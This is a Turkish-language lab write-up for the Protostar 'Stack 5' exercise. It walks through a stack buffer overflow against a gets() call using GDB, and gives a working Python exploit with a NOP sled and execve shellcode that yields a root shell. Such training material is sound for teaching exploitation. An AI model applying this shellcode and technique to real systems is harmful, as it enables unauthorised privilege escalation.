---
title: "Stack 5"
etiketler : "Protostar"
seriler: "Protostar"
sakla  : false
---

# Stack5.c

``` C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

**Önceki seviyeden farkı burada zıplanabilecek herhanbgi bir fonksiyon yok!**

**Amaç:** stack taşırılarak `eip` değerini stackten bir adresi gösterecek
şekilde ayarlayıp shellcode çalıştırmak.

# Programın Çalıştırılması
```
user@protostar:/opt/protostar/bin$ ./stack5

user@protostar:/opt/protostar/bin$ python -c "print 'A'*100" | ./stack5
Segmentation fault
```

# Dönüş adresini tespit etmek

``` text
user@protostar:/opt/protostar/bin$ ./stack4
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFF
Segmentation fault
user@protostar:/opt/protostar/bin$ dmesg | tail -1
[16102.708303] stack4[1893]: segfault at 45454545 ip 45454545 sp bffffce0 error 4
```

Programa yukarıdaki gibi uzun bir string verdikten sonra segmentation fault
alıyoruz ve dmesg çıktısına baktığımızda `ip` registerinin `45454545` olduğunu
görüyoruz.

GDB kullanarak aynı şekilde bu bilgiye ulaşılabilir.

```text
user@protostar:/opt/protostar/bin$ gdb stack5 -q
Reading symbols from /opt/protostar/bin/stack5...done.
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
0x080483c4 <main+0>:    push   ebp
0x080483c5 <main+1>:    mov    ebp,esp
0x080483c7 <main+3>:    and    esp,0xfffffff0
0x080483ca <main+6>:    sub    esp,0x50
0x080483cd <main+9>:    lea    eax,[esp+0x10]
0x080483d1 <main+13>:   mov    DWORD PTR [esp],eax
0x080483d4 <main+16>:   call   0x80482e8 <gets@plt>
0x080483d9 <main+21>:   leave
0x080483da <main+22>:   ret
End of assembler dump.
(gdb) b *main+22
Breakpoint 1 at 0x80483da: file stack5/stack5.c, line 11.
(gdb) r
Starting program: /opt/protostar/bin/stack5
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFF

Breakpoint 1, 0x080483da in main (argc=Cannot access memory at address 0x4444444c
) at stack5/stack5.c:11
11      stack5/stack5.c: No such file or directory.
        in stack5/stack5.c
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x45454545 in ?? ()
```

Tabiki eip değiştirebilmek kod işletebilmek için yeterli değil. Stackte kod
işletilebildiği durumlarda, eip'ye stackten bir adresi göstermesini
sağlayabilirsek istediğimiz shell kodunu çalıştırabiliriz.

# Stack adresini bulmak

Yukarıdaki oturumdan devam ederek registerlerin durumuna bakarsak eğer esp bize
stack pointerin en üst noktasının adresini verecektir.

```
(gdb) i r
eax            0xbffff730       -1073744080
ecx            0xbffff730       -1073744080
edx            0xb7fd9334       -1208118476
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff780       0xbffff780
ebp            0x44444444       0x44444444
esi            0x0      0
edi            0x0      0
eip            0x45454545       0x45454545
eflags         0x210246 [ PF ZF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
```

# Peki stackte nereye atlamalı

Stack'e bakacak olursak input olarak verdiğimiz A karakterlerini görebiliyoruz.

```
(gdb) x/64wx $esp-100
0xbffff71c:     0x080483d9      0xbffff730      0xb7ec6165      0xbffff738
0xbffff72c:     0xb7eada75      0x41414141      0x41414141      0x41414141
0xbffff73c:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff74c:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff75c:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff76c:     0x41414141      0x42424242      0x43434343      0x44444444
0xbffff77c:     0x45454545      0x46464646      0xbffff800      0xbffff82c
0xbffff78c:     0xb7fe1848      0xbffff7e0      0xffffffff      0xb7ffeff4
0xbffff79c:     0x08048232      0x00000001      0xbffff7e0      0xb7ff0626
0xbffff7ac:     0xb7fffab0      0xb7fe1b28      0xb7fd7ff4      0x00000000
0xbffff7bc:     0x00000000      0xbffff7f8      0x0b564e3d      0x2101382d
0xbffff7cc:     0x00000000      0x00000000      0x00000000      0x00000001
0xbffff7dc:     0x08048310      0x00000000      0xb7ff6210      0xb7eadb9b
0xbffff7ec:     0xb7ffeff4      0x00000001      0x08048310      0x00000000
0xbffff7fc:     0x08048331      0x080483c4      0x00000001      0xbffff824
0xbffff80c:     0x080483f0      0x080483e0      0xb7ff1040      0xbffff81c
```

`\x45` leri değiştirerek eipyi kontrol edebiliyorduk. Stackte daha derinlere
yazabiliyorsak o zaman shellcode'u eip'den bir sonraki adıma bırakır ve eip'yi
kendinden bir sonraki adresi gösterecek şekilde ayarlayabilirsek programın
devamında istediğimiz kodu çalıştırabiliriz.

Kod üzerinde anlaması daha kolay olacağından ufaktan script yazalım.


# stack5.py
``` python
padding = "\x41"*76
eip     = "\xb8\xf7\xff\xbf"
nop     = "\x90"

trap = "\xCC"*4
print padding + eip + nop*40 + trap
```
Koddaki `\x90` lar NOPcode olarak bilinen işlemcinin o süreyi boş geçmesini
sağlayan işlemci komutudur. Kısaca bu adreslerden birini çalıştırmayı
başlatabilirsek ileride çarpacağı herhangi bir komutu çalıştırmaya devam
edecektir.

```
user@protostar:~$ python stack5.py | /opt/protostar/bin/stack5
Trace/breakpoint trap
```

Görüldüğü üzere `\xCC` bir işlemci tuzak kodudur. Debug işlemlerinde
breakpoint'ler bu şekilde sağlanır.

Yukarıdaki kodda eip adresi, `NOP` kodlarının olduğu herhangi bir yer olabilir.


# Root

Koddaki trapleri kaldırıp shellcode yerleştirdiğimiz zaman teorik olarak root
shellimiz bizi bekliyor olacak.

``` python
padding = "\x41"*76
eip     = "\xb8\xf7\xff\xbf"
nop     = "\x90"

shellcode = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"

print padding + eip + nop*40 + shellcode
```

``` text
user@protostar:~$ python stack5.py | /opt/protostar/bin/stack5
user@protostar:~$ python stack5.py | /opt/protostar/bin/stack5
user@protostar:~$
```

Burada Linux'ta bulunan `|` işaretinden kaynaklı bir sorun var. Pipe soldaki
programın çıktısını sağdaki programa input olarak veriyor böylelikle stack5
programına istediğimiz inputu istediğimiz şekilde verebiliyoruz. Fakat soldaki
program; ekrana bufferi doldurup, eip adresini güncelleyip, bir sürü nop
ekledikten sonra shellcode yazıp kapanıyor. Böylelikle biz stack5'te kod işletme
hakkımız olmasına rağmen programdan çıkıyoruz.

Linuxta bulunan `cat` programı dosyaların içeriğini terminale basmakta
kullanılabileceği gibi hiç bir argüman verilmemesi durumunda her satırı iki kere
ekrana basar.

```
user@protostar:~$ cat
stack5  <- input
stack5  -> output
```

Python kodumuzu ve cat'i birleştirerek root kabuğu elde edilebilir.
```
user@protostar:~$ whoami
user
user@protostar:~$ whoami
user
user@protostar:~$ (python stack5.py;cat) | /opt/protostar/bin/stack5
whoami
root
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```
